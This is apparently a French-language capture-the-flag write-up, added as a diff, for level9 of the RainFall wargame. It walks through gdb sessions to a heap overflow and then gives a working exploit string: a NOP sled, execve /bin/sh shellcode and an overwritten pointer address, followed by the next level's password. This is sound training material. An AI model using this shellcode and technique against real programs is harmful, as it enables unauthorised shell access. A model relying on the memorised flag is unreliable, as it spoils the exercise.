@@ -1,0 +1,82 @@
+--------> on essaye tout dabord de faire segfault le programme. Pour cela il va falloir envoyer plus de
+--------> 108 octets pour depasser les allocation faites.
+$ gdb ./level9
+(gdb) r `python -c 'print "A"*109'`
+Starting program: /home/user/level9/level9 `python -c 'print "A"*109'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x54000000 in ?? ()
+
+--------> ok...
+(gdb) r `python -c 'print "A"*110'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level9/level9 `python -c 'print "A"*110'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) x/s $eax
+0x8044141:	 <Address 0x8044141 out of bounds>
+(gdb)
+
+--------> ah! on ecrit sur la stack a partir de 109 octets mais on reecrit qqchose a partir de 110.
+--------> essayons avec 111 et 112.
+
+(gdb) r `python -c 'print "A"*111'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level9/level9 `python -c 'print "A"*111'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) x/s $eax
+0x8414141:	 <Address 0x8414141 out of bounds>
+(gdb) r `python -c 'print "A"*112'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level9/level9 `python -c 'print "A"*112'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) x/s $eax
+0x41414141:	 <Address 0x41414141 out of bounds>
+
+---------> ok! donc en ecrvivant l'adresse de av[1] ou du malloc on devrait surement pouvoir executer un shellcode.
+---------> recuperons ces adresses. Elles sont faciles a voir elles sont passer en parametres a 
+---------> _ZN1N13setAnnotationEPc, du coup:
+
+(gdb) b *0x08048677 		(<+131>: call 0x804870e <_ZN1N13setAnnotationEPc>)
+(gdb) r `python -c 'print "A"*112'`
+Breakpoint 8, 0x08048677 in main ()
+(gdb) x/16x $esp
+0xbffff6a0:	0x08	0xa0	0x04	0x08	0xa0	0xf8	0xff	0xbf
+0xbffff6a8:	0x70	0xf7	0xff	0xbf	0x55	0x9e	0xd7	0xb7
+(gdb) x/s 0xbffff8a0
+0xbffff8a0:	 'A' <repeats 112 times>
+
+----------> 0x0804a008 est notre malloc et 0xbffff8a0 est av[1].
+----------> Ce qu'il nous faut c'est utiliser :
+   0x08048693 <+159>:	call   *%edx
+----------> Pour cela tous ces sets d'instructions
+   0x0804867c <+136>: mov    0x10(%esp),%eax
+   0x08048680 <+140>: mov    (%eax),%eax
+   0x08048682 <+142>: mov    (%eax),%edx
+----------> font que tout d'abord on charge dans $eax la valeur de $esp+0x10
+----------> puis la valeur de la valeur dans eax puis dans edx
+----------> il nous faut donc l'adresse de l'adresse de notre av[1].
+----------> et en ayant decortiquer un peu le code avant et en ayant regarder les valeurs dans lastack deci dela
+----------> j'ai trouver que 0x0804a078 convenait parfaitement a cela.
+----------> verifions:
+(gdb) r `python -c 'print "\x90"*83 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x08\x04\xa0\x78"[::-1]'`
+process 3733 is executing new program: /bin/dash
+$
+
+----------> On a notre nouveau shell !!!!
+level9@RainFall:~$ ./level9 `python -c 'print "\x90"*83 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x08\x04\xa0\x78"[::-1]'`
+$ ls
+ls: cannot open directory .: Permission denied
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+$
+
+-----------> L'explication est surement pas tres bonne mais ca marche :/.
